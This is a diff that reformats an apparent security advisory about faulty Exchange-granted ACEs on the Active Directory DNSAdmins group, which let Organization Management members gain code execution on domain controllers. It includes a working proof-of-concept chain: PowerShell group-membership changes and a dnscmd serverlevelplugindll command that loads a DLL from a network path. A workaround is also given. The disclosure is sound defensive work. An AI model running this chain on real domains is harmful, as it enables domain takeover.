@@ -24,11 +24,6 @@ These ACE are probably positioned during an update or a particular CU install. I
 If the aformentionned *Deny* ACEs are positioned on your environment, it is probably *NOT* vulnerable.
 
 
-Account	ACE type	Inheritance	Permissions	On property/ Applies to	Comments
-Exchange Windows Permissions	Allow ACE	All	WriteProp	ManagedBy /	
-Exchange Windows Permissions	Allow ACE	All	WriteProp	Member /
-Exchange Trusted Subsystem	Allow ACE	All	WriteDACL	/ Group
-
 | Account | ACE type | Inheritance | Permissions | On property/ Applies to | Comments |
 | ------- | -------- | ----------- | ----------- | ----------------------- | -------- |
 | Exchange Windows Permissions | Allow ACE | All | WriteProp | ManagedBy / | |
@@ -56,39 +51,47 @@ Any member of the Organization Management group can execute code remotely on the
 * Proof of concept
 
 1)
-##
-# From an Organization Management member account, add yourself to Exchange Windows Permissions
-# This is possible by default and normal
-##
+From an Organization Management member account, add yourself to Exchange Windows Permissions
+This is possible by default and normal
+
+```
 $id = [Security.Principal.WindowsIdentity]::GetCurrent()
 $user = Get-ADUser -Identity $id.User
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user
+```
 
 2)
 LOG OUT AND RELOG THE USERS SESSION to update groups in token
 
 3)
-##
-# Add yourself to DNSAdmins
-# This is the problem, it should not be possible
-##
+Add yourself to DNSAdmins
+This is the problem, it should not be possible
+
+```
 $id = [Security.Principal.WindowsIdentity]::GetCurrent()
 $user = Get-ADUser -Identity $id.User
 Add-ADGroupMember -Identity "DNSAdmins" -Members $user
+```
 
 4)
 LOG OUT AND RELOG THE USERS SESSION to update groups in token
 
 5)
-# Choose a domain controller and remotely change a registry key to load a dll (needs specific exports) on next DNS service restart:
-dnscmd test_domain_controller /config /serverlevelplugindll \\NetworkPath\to\dll
+Choose a domain controller and remotely change a registry key to load a dll (needs specific exports) on next DNS service restart:
 
+```
+dnscmd test_domain_controller /config /serverlevelplugindll \\NetworkPath\to\dll
+```
 
 * Workaround fix
 
 Manually with LDP: bind as a Domain Admin account with the usual precautions, as you will change the DNSadmins group DACL.
 
-Backup the DACL: (Get-Acl "AD:\CN=DNSAdmins,CN=Users,DC=...").Sddl | Out-File "dnsadmins_dacl.txt"
+Backup the DACL: 
+
+```
+(Get-Acl "AD:\CN=DNSAdmins,CN=Users,DC=...").Sddl | Out-File "dnsadmins_dacl.txt"
+```
 
 Locate the "CN=DNSAdmins,CN=Users,DC=..." security group. Disable ACE inheritance and choose to copy existing ACEs. Locate and delete the 3 faulty ACE in the DACL: you can sort by Trustee to see Exchange Windows Permissions and Exchange Trusted Subsystem.
 
